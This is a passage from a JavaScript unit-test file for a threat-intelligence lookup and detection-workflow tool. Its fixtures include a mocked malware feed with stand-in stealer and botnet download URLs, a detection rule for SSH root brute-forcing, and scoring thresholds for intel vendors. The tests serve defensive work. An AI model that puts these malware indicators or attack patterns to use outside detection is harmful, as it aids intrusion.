  const UH = '# x\n"1","2026-10-16 10:00:00","https://raw.githubusercontent.com/bad/repo/main/stealer.exe","online","2026-10-16","malware_download","Lumma,exe","https://urlhaus.abuse.ch/url/1/","r"\n'
    + '"2","2026-10-16 10:00:00","http://203.0.113.77/bins/mips","online","2026-10-16","malware_download","Mozi,elf","https://urlhaus.abuse.ch/url/2/","r"\n';
  const fetchImpl = async (url) => {
    const body = /urlhaus.*\.abuse\.ch/.test(url) ? UH : /threatfox.*\.abuse\.ch/.test(url) ? makeZip([['full.csv', '# none\n']]) : null;
    if (body == null) return { ok: false, status: 404, text: async () => '', json: async () => ({}), arrayBuffer: async () => new ArrayBuffer(0) };
    const buf = Buffer.isBuffer(body) ? body : Buffer.from(body);
    return { ok: true, status: 200, text: async () => buf.toString(), json: async () => JSON.parse(buf.toString()), arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length) };
  };
  const hub = createHub({ env: { ABUSECH_AUTH_KEY: 'test-key' }, fetchImpl, offline: false });
  hub.abusech.urlhausHost = async () => ({ hits: [] });
  const exact = await hub.lookup('https://raw.githubusercontent.com/bad/repo/main/stealer.exe');
  assert.strictEqual(exact.verdict, 'malicious', 'the listed URL itself is malicious');
  const other = await hub.lookup('https://raw.githubusercontent.com/nodejs/node/main/README.md');
  assert.notStrictEqual(other.verdict, 'malicious', 'another file on the same platform is not');
  assert.notStrictEqual(other.verdict, 'suspicious');
  const plat = await hub.lookup('raw.githubusercontent.com');
  assert.ok(!['malicious', 'suspicious'].includes(plat.verdict), `platform domain came back ${plat.verdict}`);
  const dist = await hub.lookup('http://203.0.113.77/bins/arm7');
  assert.ok(['malicious', 'suspicious'].includes(dist.verdict), 'a raw IP serving live malware still counts');
});
// ---- Workbench ---------------------------------------------------------------------
const { lintRule } = require('../src/engine/customrules');
const { otxScore } = require('../src/intel/otx');
const { haScore } = require('../src/intel/hybrid');
const wbx = require('../src/workbench');

const SSH_RULE = `title: Root login refused over SSH
description: Password guessing against root
level: high
tags: [attack.t1110.001]
falsepositives: [admins mistyping]
logsource:
  product: linux
  service: sshd
detection:
  keywords:
    - 'Failed password for root'
  condition: keywords
`;

test('custom rules: a clean rule compiles and maps ATT&CK', () => {
  const r = lintRule(SSH_RULE);
  assert.ok(r.ok, r.errors.join('; '));
  assert.strictEqual(r.rule.technique, 'T1110.001');
  assert.strictEqual(r.warnings.length, 0);
});

test('custom rules: lint reports YAML position, missing fields and bad level', () => {
  assert.match(lintRule('title: x\n  bad: [').errors[0], /line \d+/);
  const miss = lintRule('title: Something here\nlevel: high\n');
  assert.ok(miss.errors.includes('logsource is required') && miss.errors.includes('detection is required'));
  assert.ok(lintRule(SSH_RULE.replace('level: high', 'level: urgent')).errors.some((e) => /level must be/.test(e)));
  assert.ok(!lintRule(SSH_RULE.replace('service: sshd', 'service: windows-defender')).ok, 'unsupported logsource refused');
  assert.ok(lintRule(SSH_RULE.replace('tags: [attack.t1110.001]\n', '')).warnings.some((w) => /ATT&CK/.test(w)));
});

test('intel scores: OTX pulses and Hybrid Analysis verdicts', () => {
  assert.strictEqual(otxScore(null), null);
  assert.strictEqual(otxScore({ found: true, pulses: 0 }), null);
  assert.strictEqual(otxScore({ found: true, pulses: 1 }), 10);
  assert.strictEqual(otxScore({ found: true, pulses: 12 }), 30, 'pulse count alone never reaches suspicious');
  assert.strictEqual(otxScore({ found: true, pulses: 12, families: ['QakBot'] }), 50, 'pulses naming a malware family do');
  assert.strictEqual(otxScore({ found: true, pulses: 40, whitelisted: true }), null, 'allowlisted resolvers score nothing');
  const { vtScore } = require('../src/intel/virustotal');
  assert.strictEqual(vtScore({ found: true, malicious: 1, suspicious: 0 }), 10, 'one vendor is noise');
  assert.ok(vtScore({ found: true, malicious: 2, suspicious: 0 }) < 40, 'two vendors stay below suspicious');
  assert.ok(vtScore({ found: true, malicious: 3, suspicious: 0 }) >= 40, 'three vendors are suspicious');
  assert.ok(vtScore({ found: true, malicious: 6, suspicious: 0 }) >= 75, 'five or more are malicious');
  const { isSharedHost, isCdnOrg } = require('../src/intel/shared');
  assert.ok(isSharedHost('raw.githubusercontent.com') && isSharedHost('github.com') && !isSharedHost('evilgithub.com'));
  assert.ok(isCdnOrg('Cloudflare, Inc.') && !isCdnOrg('Evil Hosting LLC'));
  assert.strictEqual(haScore({ found: true, verdict: 'malicious', threat_score: 95 }), 95);
  assert.strictEqual(haScore({ found: true, verdict: 'malicious' }), 80);
  assert.strictEqual(haScore({ found: true, verdict: 'suspicious' }), 50);
  assert.strictEqual(haScore({ found: true, verdict: 'no specific threat' }), 0);
  assert.strictEqual(haScore({ found: false }), null);
});

test('workflows: templates resolve and conditions evaluate', () => {
  const scope = { input: { ip: '203.0.113.9' }, steps: { a: { hits: 3, list: ['x', 'y'], none: [], outcome: 'ATTACK_FAILED' } } };
  assert.strictEqual(wbx.resolve('{{input.ip}}', scope), '203.0.113.9');
  assert.deepStrictEqual(wbx.resolve('{{steps.a.list}}', scope), ['x', 'y'], 'a whole-value template keeps its type');
  assert.strictEqual(wbx.resolve('hits={{steps.a.hits}} on {{steps.a.list}} {{steps.zz.q}}.', scope), 'hits=3 on x, y .');
  assert.strictEqual(wbx.test(null, scope), true);
  assert.strictEqual(wbx.test({ path: 'steps.a.list', op: 'nonempty' }, scope), true);
  assert.strictEqual(wbx.test({ path: 'steps.a.none', op: 'nonempty' }, scope), false);
  assert.strictEqual(wbx.test({ path: 'steps.a.none', op: 'empty' }, scope), true);
  assert.strictEqual(wbx.test({ path: 'steps.a.outcome', op: 'in', value: 'ATTACK_SUCCEEDED,ATTACK_FAILED' }, scope), true);
  assert.strictEqual(wbx.test({ path: 'steps.a.hits', op: 'gte', value: 4 }, scope), false);
  assert.strictEqual(wbx.test({ path: 'steps.a.hits', op: 'lte', value: 3 }, scope), true);
  assert.strictEqual(wbx.test({ path: 'steps.a.hits', op: 'bogus' }, scope), false);
});

test('workflows: validation rejects forward references, unknown steps and bad ids', () => {
  for (const t of wbx.TEMPLATES) assert.ok(wbx.validateWorkflow(t).steps.length, `template ${t.key} validates`);
  const base = { name: 'Sweep', inputs: [{ key: 'ip', label: 'IP' }] };
  const bad = (steps, re) => assert.throws(() => wbx.validateWorkflow({ ...base, steps }), (e) => re.test(e.message));
  bad([], /at least one step/);
  bad([{ id: 'a', type: 'format_disk', params: {} }], /unknown type/);
  bad([{ id: 'a', type: 'hunt', params: { ip: '{{steps.b.ip}}' } }, { id: 'b', type: 'intel_lookup', params: { values: 'x' } }], /does not run before/);
  bad([{ id: 'a', type: 'hunt', params: { ip: '{{input.host}}' } }], /does not declare/);
  bad([{ id: 'A b', type: 'notify', params: { message: 'hi' } }], /lower_case/);
  bad([{ id: 'a', type: 'notify', params: {} }], /required/);
  bad([{ id: 'a', type: 'notify', params: { message: 'x' } }, { id: 'a', type: 'notify', params: { message: 'y' } }], /used twice/);
  bad([{ id: 'a', type: 'notify', params: { message: 'x' }, when: { path: 'steps.zz.q', op: 'nonempty' } }], /earlier step/);
  assert.throws(() => wbx.validateWorkflow({ name: 'x', steps: [{ type: 'notify', params: { message: 'm' } }] }), /3 characters/);
});

(async () => {
  let failed = 0;
  for (const [name, fn] of tests) {
    try { await fn(); n++; console.log(`PASS ${name}`); } catch (err) { failed++; console.log(`FAIL ${name}\n  ${err.stack.split('\n').slice(0, 3).join('\n  ')}`); }
  }
  console.log(`\n${n}/${tests.length} unit tests passed`);
  process.exit(failed ? 1 : 0);
})();